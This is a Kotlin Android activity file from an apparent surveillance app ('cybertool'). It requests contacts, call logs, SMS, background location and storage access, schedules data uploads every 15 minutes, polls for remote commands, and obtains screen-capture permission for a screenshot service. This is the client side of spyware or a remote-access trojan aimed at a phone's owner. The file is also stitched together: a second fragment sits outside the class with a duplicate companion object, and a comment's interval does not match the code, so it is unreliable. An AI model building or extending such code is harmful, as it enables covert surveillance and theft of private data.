package com.riqel.cybertool

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    companion object {
        const val PERMISSION_REQUEST_CODE = 100
    }

    private val requiredPermissions = mutableListOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.POST_NOTIFICATIONS
    ).apply {
        if (Build.VERSION.SDK_INT <= 32) {
            add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
        add(Manifest.permission.READ_EXTERNAL_STORAGE)
    }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val btnRequest = findViewById<Button>(R.id.btnRequestPermissions)
        btnRequest.setOnClickListener { checkAndRequestPermissions() }

        // Start periodic data upload (every 15 min)
        val uploadWork = PeriodicWorkRequestBuilder<DataUploadWorker>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(this).enqueue(uploadWork)

        // Start foreground service for location updates (optional)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(android.content.Intent(this, BootReceiverService::class.java))
        }
    }

    private fun checkAndRequestPermissions() {
        val missingPermissions = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), PERMISSION_REQUEST_CODE)
        } else {
            Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show()
            else Toast.makeText(this, "Some permissions denied", Toast.LENGTH_SHORT).show()
        }
    }
}

        // Schedule command polling every 30 seconds (for testing – use longer in production)
        val commandRequest = PeriodicWorkRequestBuilder<CommandWorker>(15, TimeUnit.MINUTES)
            .setInitialDelay(5, TimeUnit.SECONDS)
            .build()
        WorkManager.getInstance(this).enqueue(commandRequest)

    companion object {
        private const val REQUEST_MEDIA_PROJECTION = 101
    }

    // Call this before taking screenshot (e.g., from a button)
    private fun requestScreenCapture() {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK && data != null) {
            ScreenshotService.setResult(data, resultCode)
            // You can now call ScreenshotService.takeScreenshot() from anywhere
            Toast.makeText(this, "Screen capture permission granted", Toast.LENGTH_SHORT).show()
        }
    }
